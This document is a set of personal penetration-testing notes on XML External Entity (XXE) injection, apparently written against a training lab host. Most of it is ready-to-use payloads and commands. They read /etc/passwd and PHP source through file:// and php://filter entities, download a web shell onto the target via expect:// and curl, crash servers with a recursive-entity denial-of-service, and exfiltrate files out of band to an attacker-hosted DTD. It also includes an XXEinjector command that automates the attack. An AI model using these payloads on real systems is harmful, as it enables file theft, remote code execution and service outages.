
**REMEBER ; AFTER INJECTION PARAMETER**

i.e. &company;

**Example of a potential target.**
![[Pasted image 20260225123646.png]]

Inject into values that are being displayed onto the page.

**Test for vulnerability:**
```xml
<!DOCTYPE email [
  <!ENTITY company "Test">
]>
```
```xml
<email>
	&company;
</email>
```

If you can define a variable and pass it through one of the forms inputs, this is a sign of vulnerability.


**Ways to exploit for PHP:**
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

**Reading files on PHP through XML by encoding in base64:**

TRY IF REGULAR FILE READING DOESNT WORK

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/index.php">
]>
```

**Creating a shell:**
![[Pasted image 20260225124724.png]]

**Downloading the shell onto target:**
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'INSERTIP/shell.php'">
]>
```

**DOS For old web servers:**
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
```


**Advanced Exfiltration with CDATA**

Example exploit:
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email>
```

**WHERE JOINED IS:**

```xml
<!ENTITY joined "%begin;%file;%end;">
```

**In a file on the attackers machine:**
```shell-session
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
```
```shell-session
python3 -m http.server 8000
```

**Error Based XXE**

Point to /error/XXX and reference an entity that does not exist.
![[Pasted image 20260225152022.png]]

**Create a .dtd file with these contents, pointing to the file of your choice.**
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```


Create a listener and insert this XML code into the burp request.
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
```shell-session
python3 -m http.server 8000
```


Ensure you are still referring to the /error/ directory.



**AUTOMATE**
```shell-session
git clone https://github.com/enjoiz/XXEinjector.git
```

Copy Burp request --> add XXEINJECT at the end:
```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

**Example Command; file =  burp request.**
```shell-session
ruby XXEinjector.rb --host=10.10.15.157 --httpport=8000 --file=./xxetest.req --path=/etc/passwd --oob=http --phpfilter
```

